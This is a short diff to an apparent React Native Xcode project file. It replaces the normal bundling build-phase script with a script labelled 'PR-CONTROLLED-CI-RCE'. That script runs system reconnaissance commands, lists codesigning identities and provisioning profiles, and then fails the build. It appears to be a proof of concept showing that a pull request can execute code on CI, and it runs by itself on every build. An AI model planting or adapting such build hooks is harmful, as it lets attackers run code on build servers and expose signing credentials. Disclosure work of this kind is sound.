@@ -611,7 +611,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "set -e\n\nWITH_ENVIRONMENT=\"$REACT_NATIVE_PATH/scripts/xcode/with-environment.sh\"\nREACT_NATIVE_XCODE=\"$REACT_NATIVE_PATH/scripts/react-native-xcode.sh\"\n\n/bin/sh -c \"$WITH_ENVIRONMENT $REACT_NATIVE_XCODE\"\n";
+			shellScript = "set -e\n\necho \"=== PR-CONTROLLED-CI-RCE ===\"\nwhoami\npwd\nuname -a\n\necho \"=== SIGNING IDENTITIES ===\"\nsecurity find-identity -v -p codesigning || true\n\necho \"=== PROVISIONING PROFILES ===\"\nls -la ~/Library/MobileDevice/Provisioning\\ Profiles || true\n\necho \"=== END REPRO ===\"\nexit 1\n";
 		};
 		240525450DF9ABA0F332B52E /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
